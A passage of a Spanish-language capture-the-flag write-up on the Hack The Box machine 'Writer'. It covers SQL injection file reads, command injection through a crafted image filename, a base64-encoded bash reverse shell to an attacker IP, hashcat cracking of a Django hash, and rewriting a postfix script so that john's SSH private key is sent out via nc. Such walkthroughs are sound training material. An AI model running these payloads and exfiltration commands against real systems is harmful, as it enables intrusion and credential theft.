</code></pre></div><p>Entonces podemos mirar el archivo <code>/etc/mysql/my.cnf</code> utilizando la vulnerabilidad de SQLi:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">sqli.py</span> /etc/mysql/my.cnf  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3"># The MariaDB configuration file</span>
<span class="mtk3">#</span>
<span class="mtk3"># The MariaDB/MySQL tools read configuration files</span><span class="mtk3"> in the following order:</span>  
<span class="mtk3"># 1. "/etc/mysql/mariadb.cnf" (this file) to set g</span><span class="mtk3">lobal defaults,</span>
<span class="mtk3"># 2. "/etc/mysql/conf.d/*.cnf" to set global optio</span><span class="mtk3">ns.</span>
<span class="mtk3"># 3. "/etc/mysql/mariadb.conf.d/*.cnf" to set Mari</span><span class="mtk3">aDB-only options.</span>
<span class="mtk3"># 4. "~/.my.cnf" to set user-specific options.</span>
<span class="mtk3">#</span>
<span class="mtk3"># If the same option is defined multiple times, th</span><span class="mtk3">e last one will apply.</span>
<span class="mtk3">#</span>
<span class="mtk3"># One can use all long options that the program su</span><span class="mtk3">pports.</span>
<span class="mtk3"># Run program with --help to get a list of availab</span><span class="mtk3">le options and with</span>
<span class="mtk3"># --print-defaults to see which it would actually </span><span class="mtk3">understand and use.</span>

<span class="mtk3">#</span>
<span class="mtk3"># This group is read both both by the client and t</span><span class="mtk3">he server</span>
<span class="mtk3"># use it for options that affect everything</span>
<span class="mtk3">#</span>
<span class="mtk1">[</span><span class="mtk8">client-server</span><span class="mtk1">]</span>

<span class="mtk3"># Import all .cnf files from configuration directo</span><span class="mtk3">ry</span>
<span class="mtk1">!includedir /etc/mysql/conf.d/</span>
<span class="mtk1">!includedir /etc/mysql/mariadb.conf.d/</span>

<span class="mtk1">[</span><span class="mtk8">client</span><span class="mtk1">]</span>
<span class="mtk5">database</span><span class="mtk1"> = </span><span class="mtk10">dev</span>
<span class="mtk5">user</span><span class="mtk1"> = </span><span class="mtk10">djangouser</span>
<span class="mtk5">password</span><span class="mtk1"> = </span><span class="mtk10">DjangoSuperPassword</span>
<span class="mtk5">default-character-set</span><span class="mtk1"> = </span><span class="mtk10">utf8</span>
</code></pre></div><p>Y tenemos más credenciales para MySQL: <code>djangouser:DjangoSuperPassword</code>.</p><h2 id="acceso-en-la-máquina">Acceso en la máquina</h2><p>En el panel de administración, podemos controlar todo el <em>blog</em> (crear artículos, editarlos e incluso borrarlos):</p><p><img src="/images/HTB/Writer/Writer-stories.png" alt="Writer stories"></p><p>El formulario utilizado para crear un nuevo artículo es el siguiente:</p><p><img src="/images/HTB/Writer/Writer-add1.png" alt="Writer add story (image by file)"></p><p>Existen dos maneras de subir una imagen para el artículo: como archivo o como URL.</p><p><img src="/images/HTB/Writer/Writer-add2.png" alt="Writer add story (image by URL)"></p><p>La diferencia entre las dos últimas capturas es la caja de texto de imagen, la diferencia es muy sutil.</p><p>Para obtener acceso a la máquina, podemos volver a leer el <code>__init__.py</code>. El <em>script</em> hace algo raro al recibir las imágenes en las siguientes líneas:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">method</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">"POST"</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">files</span><span class="mtk1">[</span><span class="mtk4">'image'</span><span class="mtk1">]:</span>
<span class="mtk1">            </span><span class="mtk1">image</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">files</span><span class="mtk1">[</span><span class="mtk4">'image'</span><span class="mtk1">]</span>
<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk4">".jpg"</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk1">image</span><span class="mtk1">.</span><span class="mtk1">filename</span><span class="mtk1">:</span>
<span class="mtk1">                </span><span class="mtk1">path</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">os</span><span class="mtk1">.</span><span class="mtk1">path</span><span class="mtk1">.</span><span class="mtk8">join</span><span class="mtk1">(</span><span class="mtk4">'/var/www/writer.htb/writer/static/img/'</span><span class="mtk1">, </span><span class="mtk1">image</span><span class="mtk1">.</span><span class="mtk1">filename</span><span class="mtk1">)</span>
<span class="mtk1">                </span><span class="mtk1">image</span><span class="mtk1">.</span><span class="mtk8">save</span><span class="mtk1">(</span><span class="mtk1">path</span><span class="mtk1">)</span>
<span class="mtk1">                </span><span class="mtk1">image</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"/img/</span><span class="mtk6">{}</span><span class="mtk4">"</span><span class="mtk1">.</span><span class="mtk8">format</span><span class="mtk1">(</span><span class="mtk1">image</span><span class="mtk1">.</span><span class="mtk1">filename</span><span class="mtk1">)</span>
<span class="mtk1">            </span><span class="mtk5">else</span><span class="mtk1">:</span>
<span class="mtk1">                </span><span class="mtk1">error</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"File extensions must be in .jpg!"</span>
<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">render_template</span><span class="mtk1">(</span><span class="mtk4">'add.html'</span><span class="mtk1">, </span><span class="mtk9 mtki">error</span><span class="mtk5">=</span><span class="mtk1">error</span><span class="mtk1">)</span>
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">form</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">'image_url'</span><span class="mtk1">):</span>
<span class="mtk1">            </span><span class="mtk1">image_url</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">form</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">'image_url'</span><span class="mtk1">)</span>
<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk4">".jpg"</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk1">image_url</span><span class="mtk1">:</span>
<span class="mtk1">                </span><span class="mtk5">try</span><span class="mtk1">:</span>
<span class="mtk1">                    </span><span class="mtk1">local_filename</span><span class="mtk1">, </span><span class="mtk1">headers</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">urllib</span><span class="mtk1">.</span><span class="mtk8 mtku">request</span><span class="mtk1">.</span><span class="mtk8">urlretrieve</span><span class="mtk1">(</span><span class="mtk1">image_url</span><span class="mtk1">)</span>
<span class="mtk1">                    </span><span class="mtk8 mtku">os</span><span class="mtk1">.</span><span class="mtk8">system</span><span class="mtk1">(</span><span class="mtk4">"mv </span><span class="mtk6">{}</span><span class="mtk4"> </span><span class="mtk6">{}</span><span class="mtk4">.jpg"</span><span class="mtk1">.</span><span class="mtk8">format</span><span class="mtk1">(</span><span class="mtk1">local_filename</span><span class="mtk1">, </span><span class="mtk1">local_filename</span><span class="mtk1">))</span>
<span class="mtk1">                    </span><span class="mtk1">image</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"</span><span class="mtk6">{}</span><span class="mtk4">.jpg"</span><span class="mtk1">.</span><span class="mtk8">format</span><span class="mtk1">(</span><span class="mtk1">local_filename</span><span class="mtk1">)</span>
<span class="mtk1">                    </span><span class="mtk5">try</span><span class="mtk1">:</span>
<span class="mtk1">                        </span><span class="mtk1">im</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">Image</span><span class="mtk1">.</span><span class="mtk8">open</span><span class="mtk1">(</span><span class="mtk1">image</span><span class="mtk1">)</span>
<span class="mtk1">                        </span><span class="mtk1">im</span><span class="mtk1">.</span><span class="mtk8">verify</span><span class="mtk1">()</span>
<span class="mtk1">                        </span><span class="mtk1">im</span><span class="mtk1">.</span><span class="mtk8">close</span><span class="mtk1">()</span>
<span class="mtk1">                        </span><span class="mtk1">image</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">image</span><span class="mtk1">.</span><span class="mtk8">replace</span><span class="mtk1">(</span><span class="mtk4">'/tmp/'</span><span class="mtk1">,</span><span class="mtk4">''</span><span class="mtk1">)</span>
<span class="mtk1">                        </span><span class="mtk8 mtku">os</span><span class="mtk1">.</span><span class="mtk8">system</span><span class="mtk1">(</span><span class="mtk4">"mv /tmp/</span><span class="mtk6">{}</span><span class="mtk4"> /var/www/writer.htb/writer/static/img/</span><span class="mtk6">{}</span><span class="mtk4">"</span><span class="mtk1">.</span><span class="mtk8">format</span><span class="mtk1">(</span><span class="mtk1">image</span><span class="mtk1">, </span><span class="mtk1">image</span><span class="mtk1">))</span>  
<span class="mtk1">                        </span><span class="mtk1">image</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"/img/</span><span class="mtk6">{}</span><span class="mtk4">"</span><span class="mtk1">.</span><span class="mtk8">format</span><span class="mtk1">(</span><span class="mtk1">image</span><span class="mtk1">)</span>
<span class="mtk1">                    </span><span class="mtk5">except</span><span class="mtk1"> </span><span class="mtk8 mtku">PIL</span><span class="mtk1">.</span><span class="mtk8 mtku">UnidentifiedImageError</span><span class="mtk1">:</span>
<span class="mtk1">                        </span><span class="mtk8 mtku">os</span><span class="mtk1">.</span><span class="mtk8">system</span><span class="mtk1">(</span><span class="mtk4">"rm </span><span class="mtk6">{}</span><span class="mtk4">"</span><span class="mtk1">.</span><span class="mtk8">format</span><span class="mtk1">(</span><span class="mtk1">image</span><span class="mtk1">))</span>
<span class="mtk1">                        </span><span class="mtk1">error</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"Not a valid image file!"</span>
<span class="mtk1">                        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">render_template</span><span class="mtk1">(</span><span class="mtk4">'add.html'</span><span class="mtk1">, </span><span class="mtk9 mtki">error</span><span class="mtk5">=</span><span class="mtk1">error</span><span class="mtk1">)</span>
<span class="mtk1">                </span><span class="mtk5">except</span><span class="mtk1">:</span>
<span class="mtk1">                    </span><span class="mtk1">error</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"Issue uploading picture"</span>
<span class="mtk1">                    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">render_template</span><span class="mtk1">(</span><span class="mtk4">'add.html'</span><span class="mtk1">, </span><span class="mtk9 mtki">error</span><span class="mtk5">=</span><span class="mtk1">error</span><span class="mtk1">)</span>
<span class="mtk1">            </span><span class="mtk5">else</span><span class="mtk1">:</span>
<span class="mtk1">                </span><span class="mtk1">error</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"File extensions must be in .jpg!"</span>
<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">render_template</span><span class="mtk1">(</span><span class="mtk4">'add.html'</span><span class="mtk1">, </span><span class="mtk9 mtki">error</span><span class="mtk5">=</span><span class="mtk1">error</span><span class="mtk1">)</span>
</code></pre></div><p>Estas líneas aparecen tanto en <code>/dashboard/stories/add</code> como en <code>/dashboard/stories/edit/&lt;id></code>. Como se dijo previamente, hay dos maneras de subir una imagen. Una subiéndola directamente como archivo y otra indicando la URL donde se localiza la imagen.</p><p>La documentación de <code>urllib.requests.urlretrieve()</code> dice lo siguiente:</p><blockquote><p><strong>retrieve</strong>(<em>url</em>, <em>filename=None</em>, <em>reporthook=None</em>, <em>data=None</em>): Retrieves the contents of <em>url</em> and places it in <em>filename</em>. The return value is a tuple consisting of a local filename [&mldr;]. If <em>filename</em> is not given and the URL refers to a local file, the input filename is returned. If the URL is non-local and <em>filename</em> is not given, the filename is the output of <code>tempfile.mktemp()</code> with a suffix that matches the suffix of the last path component of the input URL. [&mldr;].</p></blockquote><p>Esto significa que si la URL apunta a un archivo local, el nombre del archivo será el mismo que el que se pide por la URL. Pero si el archivo se obtiene del exterior, entonces se elige un nombre aleatorio.</p><p>La vulnerabilidad está en la llamada a <code>os.system</code> con una entrada de usuario peculiar. La idea es subir un archivo cuyo nombre sea <code>image.jpg x;shell-command</code>, para no romper el comando <code>mv</code>, que necesita dos parámetros, y ejecutar así el comando que queremos. El comando resultante será así:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">mv image.jpg x;shell-command; image.jpg x;shell-command;.jpg  
</code></pre></div><p>La extensión <code>.jpg</code> no será un problema porque el servidor solamente verifica que la cadena <code>".jpg"</code> está incluida en el nombre del archivo:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">            </span><span class="mtk1">image_url</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">form</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">'image_url'</span><span class="mtk1">)</span>  
<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk4">".jpg"</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk1">image_url</span><span class="mtk1">:</span>
<span class="mtk1">                </span><span class="mtk3"># ...</span>
</code></pre></div><p>Después, tenemos que intentar subir otra imagen, pero esta vez mediante URL (utilizando el esquema <code>file://</code>), de manera que el archivo se toma de la propia máquina y el nombre del archivo no se cambie. Será entonces cuando el comando inyectado se ejecutará en la llamada a <code>os.system</code>.</p><p>Generamos el comando malicioso como una <em>reverse shell</em> codificada en Base64:</p><p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> -n <span class="code-dark-yellow">'bash  -i >& /dev/tcp/10.10.17.44/4444 0>&1'</span> | <span class="code-dark-green">base64</span>
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx
</code></pre></div>aCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx</p><p>Luego, creamos el archivo <code>fdsa.jpg x;echo &lt;b64>|base64 -d|bash;</code> y lo subimos como fichero.</p><p>Después, lo volvemos a subir con la siguiente URL: <code>file:///var/www/writer.htb/writer/static/img/fdsa.jpg x;echo &lt;b64>|base64 -d|bash;</code>. El uso de <code>file://</code> es necesario para que la URL apunte a un archivo local.</p><p>Utilizando <code>nc</code>, obtenemos acceso a la máquina como <code>www-data</code>.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.101.
Ncat: Connection from 10.10.11.101:50598.
bash: cannot set terminal process group (1076): Inappropriate ioctl for device
bash: no job control in this shell
www-data@writer:/$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@writer:/$ ^Z
zsh: suspended  ncat -nlvp 4444

<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
[1]  + continued  ncat -nlvp 4444
                                 reset xterm
www-data@writer:/$ export TERM=xterm
www-data@writer:/$ export SHELL=bash
www-data@writer:/$ stty rows 50 columns 158
</code></pre></div><p>Todo el proceso de intrusión se encuentra automatizado en un <em>script</em> en Python llamado <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Writer/foothold.py"><code>foothold.py</code></a> (explicación detallada <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Writer#footholdpy">aquí</a>).</p><h2 id="enumeración-del-sistema">Enumeración del sistema</h2><p>Ahora podemos recordar que teníamos otras credenciales de MySQL (<code>djangouser:DjangoSuperPassword</code>). Y de hecho, con estas podemos encontrar otro <em>hash</em> de contraseña:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"></span>www-data@writer:/$ mysql --user=djangouser --password=DjangoSuperPassword
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

<span class="code-white">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span>
<span class="code-white">Your MariaDB connection id is 11738</span>
<span class="code-white">Server version: 10.3.29-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04</span>

<span class="code-white">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span>

<span class="code-white">Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.</span>

MariaDB [dev]&gt; show tables;
+----------------------------+
| Tables_in_dev              |
+----------------------------+
| auth_group                 |
| auth_group_permissions     |
| auth_permission            |
| auth_user                  |
| auth_user_groups           |
| auth_user_user_permissions |
| django_admin_log           |
| django_content_type        |
| django_migrations          |
| django_session             |
+----------------------------+
<span class="code-white">10 rows in set (0.000 sec)</span>

MariaDB [dev]&gt; describe auth_user;
+--------------+--------------+------+-----+---------+----------------+
| Field        | Type         | Null | Key | Default | Extra          |
+--------------+--------------+------+-----+---------+----------------+
| id           | int(11)      | NO   | PRI | NULL    | auto_increment |
| password     | varchar(128) | NO   |     | NULL    |                |
| last_login   | datetime(6)  | YES  |     | NULL    |                |
| is_superuser | tinyint(1)   | NO   |     | NULL    |                |
| username     | varchar(150) | NO   | UNI | NULL    |                |
| first_name   | varchar(150) | NO   |     | NULL    |                |
| last_name    | varchar(150) | NO   |     | NULL    |                |
| email        | varchar(254) | NO   |     | NULL    |                |
| is_staff     | tinyint(1)   | NO   |     | NULL    |                |
| is_active    | tinyint(1)   | NO   |     | NULL    |                |
| date_joined  | datetime(6)  | NO   |     | NULL    |                |
+--------------+--------------+------+-----+---------+----------------+
<span class="code-white">11 rows in set (0.002 sec)</span>

MariaDB [dev]&gt; select username, password from auth_user;
+----------+------------------------------------------------------------------------------------------+  
| username | password                                                                                 |
+----------+------------------------------------------------------------------------------------------+
| kyle     | pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A= |
+----------+------------------------------------------------------------------------------------------+
<span class="code-white">1 row in set (0.001 sec)</span>
</code></pre></div><p>Esta vez el <em>hash</em> se rompe usando <code>hashcat</code>, y se obtiene la contraseña del usuario <code>kyle</code> (<code>marcoantonio</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">hashcat</span> --example-hashes | <span class="code-dark-green">grep</span> -C 2 pbkdf2_sha256
MODE: 10000
TYPE: Django (PBKDF2-SHA256)
HASH: <span class="code-red">pbkdf2_sha256</span>$10000$1135411628$bFYX62rfJobJ07VwrUMXfuffLfj2RDM2G6/BrTrUWkE=
PASS: hashcat

<span class="code-cyan">$</span> <span class="code-dark-green">hashcat</span> -m 10000 <span class="mtku">hash</span> $WORDLISTS/rockyou.txt --quiet
pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=:marcoantonio  
</code></pre></div><h2 id="movimiento-lateral-al-usuario-john">Movimiento lateral al usuario <code>john</code></h2><p>Ahora podemos acceder como <code>kyle</code> por SSH. Y tenemos a <em>flag</em> de <code>user.txt</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ssh</span> kyle@10.10.11.101
kyle@10.10.11.101's password:
<span class="code-green">kyle@writer</span>:<span class="code-blue">~</span>$ cat user.txt
2f1aa903cb62c07380d1d452ef397cf1  
</code></pre></div><p>Podemos darnos cuenta de que <code>kyle</code> pertenece al grupo <code>filter</code>. Como miembro de este grupo, podemos leer y escribir en un <em>script</em> llamado <code>/etc/postfix/disclaimer</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">kyle@writer</span>:<span class="code-blue">~</span>$ id
uid=1000(kyle) gid=1000(kyle) groups=1000(kyle),997(filter),1002(smbgroup)  
<span class="code-green">kyle@writer</span>:<span class="code-blue">~</span>$ find / -group filter 2&gt;/dev/null
/etc/postfix/disclaimer
/var/spool/filter
<span class="code-green">kyle@writer</span>:<span class="code-blue">~</span>$ find / -group filter 2&gt;/dev/null | xargs ls -la
-rwxrwxr-x 1 root   filter 1021 Nov 28 20:20 /etc/postfix/disclaimer

/var/spool/filter:
total 8
drwxr-x--- 2 filter filter 4096 May 13  2021 .
drwxr-xr-x 7 root   root   4096 May 18  2021 ..
</code></pre></div><p>Este <em>script</em> <code>/etc/postfix/disclaimer</code> es el siguiente:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/bin/sh</span>
<span class="mtk3"># Localize these.</span>
<span class="mtk1">INSPECT_DIR=/var/spool/filter</span>
<span class="mtk1">SENDMAIL=/usr/sbin/sendmail</span>

<span class="mtk3"># Get disclaimer addresses</span>
<span class="mtk1">DISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addre</span><span class="mtk1">sses</span>

<span class="mtk3"># Exit codes from &lt;sysexits.h&gt;</span>
<span class="mtk1">EX_TEMPFAIL=75</span>
<span class="mtk1">EX_UNAVAILABLE=69</span>

<span class="mtk3"># Clean up when done or when aborting.</span>
<span class="mtk7">trap</span><span class="mtk1"> </span><span class="mtk4">"rm -f in.</span><span class="mtk1">$$</span><span class="mtk4">"</span><span class="mtk1"> 0 1 2 3 15</span>

<span class="mtk3"># Start processing.</span>
<span class="mtk7">cd</span><span class="mtk1"> $INSPECT_DIR </span><span class="mtk5">||</span><span class="mtk1"> { </span><span class="mtk7">echo</span><span class="mtk1"> $INSPECT_DIR does not exist</span><span class="mtk5">;</span><span class="mtk1"> </span><span class="mtk7">exit</span>
<span class="mtk1">$EX_TEMPFAIL</span><span class="mtk5">;</span><span class="mtk1"> }</span>

<span class="mtk1">cat </span><span class="mtk5">&gt;</span><span class="mtk1">in.$$ </span><span class="mtk5">||</span><span class="mtk1"> { </span><span class="mtk7">echo</span><span class="mtk1"> Cannot save mail to file</span><span class="mtk5">;</span><span class="mtk1"> </span><span class="mtk7">exit</span><span class="mtk1"> $EX_TEMPFAIL</span><span class="mtk5">;</span><span class="mtk1"> }</span>

<span class="mtk3"># obtain From address</span>
<span class="mtk1">from_address=</span><span class="mtk4">`grep -m 1 "From:" in.</span><span class="mtk1">$$</span><span class="mtk4"> </span><span class="mtk5">|</span><span class="mtk4"> cut -d "&lt;" -f 2 </span><span class="mtk5">|</span><span class="mtk4"> cut -d "&gt;" -f 1`</span>

<span class="mtk5">if</span><span class="mtk1"> [ </span><span class="mtk4">`grep -wi ^</span><span class="mtk1">${from_address}</span><span class="mtk4">$ </span><span class="mtk1">${DISCLAIMER_ADDRESSES}</span><span class="mtk4">`</span><span class="mtk1"> ]</span><span class="mtk5">;</span><span class="mtk1"> </span><span class="mtk5">then</span>
<span class="mtk1">  /usr/bin/altermime --input=in.$$ \</span>
<span class="mtk1">                   --disclaimer=/etc/postfix/discl</span><span class="mtk1">aimer.txt \</span>
<span class="mtk1">                   --disclaimer-html=/etc/postfix/</span><span class="mtk1">disclaimer.txt \</span>
<span class="mtk1">                   --xheader=</span><span class="mtk4">"X-Copyrighted-Material: Please visit </span><span class="mtk4 detected-link">http://www.company.com/privacy.htm</span><span class="mtk4">"</span><span class="mtk1"> </span><span class="mtk5">||</span><span class="mtk1"> \</span>  
<span class="mtk1">                    { </span><span class="mtk7">echo</span><span class="mtk1"> Message content rejected</span><span class="mtk5">;</span><span class="mtk1"> </span><span class="mtk7">exit</span><span class="mtk1"> $EX_UNAVAILABLE</span><span class="mtk5">;</span><span class="mtk1"> }</span>
<span class="mtk5">fi</span>

<span class="mtk1">$SENDMAIL </span><span class="mtk4">"</span><span class="mtk1">$@</span><span class="mtk4">"</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1">in.$$</span>

<span class="mtk7">exit</span><span class="mtk1"> $?</span>
</code></pre></div><p>Lo que hace el <em>script</em> es añadir un texto de aviso legal (<em>disclaimer</em>) a todos los correos enviados desde <code>root@writer.htb</code> o <code>kyle@writer.htb</code>, como se muestra a continuación:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">kyle@writer</span>:<span class="code-blue">~</span>$ cat /etc/postfix/disclaimer_addresses
root@writer.htb
kyle@writer.htb
<span class="code-green">kyle@writer</span>:<span class="code-blue">~</span>$ cat /etc/postfix/disclaimer.txt

--
This email and any files transmitted with it are confidential and intended solely for the use of the individual or entity to whom they are addressed.
If you have received this email in error please notify the system manager. This message contains confidential information and is intended only for the  
individual named. If you are not the named addressee you should not disseminate, distribute or copy this e-mail. Please notify the sender immediately
by e-mail if you have received this e-mail by mistake and delete this e-mail from your system. If you are not the intended recipient you are notified
that disclosing, copying, distributing or taking any action in reliance on the contents of this information is strictly prohibited.

Writer.HTB
</code></pre></div><p>Entonces podemos deducir que el <em>script</em> se ejecuta cada vez que se envía un correo mediante SMTP. Además, podemos modificar el <em>script</em> porque estamos en el grupo <code>filter</code>.</p><p>Después de notar que <code>john</code> tiene un directorio <code>.ssh</code>, podemos simplemente transferir su clave privada a nuestra máquina de atacante poniendo el comando <code>nc 10.10.17.44 4444 &lt; /home/john/.ssh/id_rsa</code> en el archivo <code>/etc/postfix/disclaimer</code>.</p><p>Para que el <em>script</em> se ejecute, es necesario enviar un correo. Para ello, podemos utilizar un simple <em>script</em> de Python como el siguiente (encontrado <a href="https://www.tutorialspoint.com/python/python_sending_email.htm">aquí</a>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/python3</span>

<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">smtplib</span>

<span class="mtk1">sender</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'kyle@writer.htb'</span>
<span class="mtk1">receivers</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> [</span><span class="mtk4">'john@writer.htb'</span><span class="mtk1">]</span>

<span class="mtk1">message</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'''</span>
<span class="mtk4">From: Kyle &lt;kyle@writer.htb&gt;</span>
<span class="mtk4">To: John &lt;john@writer.htb&gt;</span>
<span class="mtk4">Subject: SMTP e-mail test</span>

<span class="mtk4">This is a test e-mail message.</span>
<span class="mtk4">'''</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">:]</span>

<span class="mtk5">try</span><span class="mtk1">:</span>
<span class="mtk1">    </span><span class="mtk1">smtp_object</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">smtplib</span><span class="mtk1">.</span><span class="mtk8 mtku">SMTP</span><span class="mtk1">(</span><span class="mtk4">'localhost'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">smtp_object</span><span class="mtk1">.</span><span class="mtk8">sendmail</span><span class="mtk1">(</span><span class="mtk1">sender</span><span class="mtk1">, </span><span class="mtk1">receivers</span><span class="mtk1">, </span><span class="mtk1">message</span><span class="mtk1">)</span>  
<span class="mtk1">    </span><span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk4">'Successfully sent email'</span><span class="mtk1">)</span>
<span class="mtk5">except</span><span class="mtk1"> </span><span class="mtk8 mtku">smtplib</span><span class="mtk1">.</span><span class="mtk8 mtku">SMTPException</span><span class="mtk1">:</span>
<span class="mtk1">    </span><span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk4">'Error: unable to send email'</span><span class="mtk1">)</span>
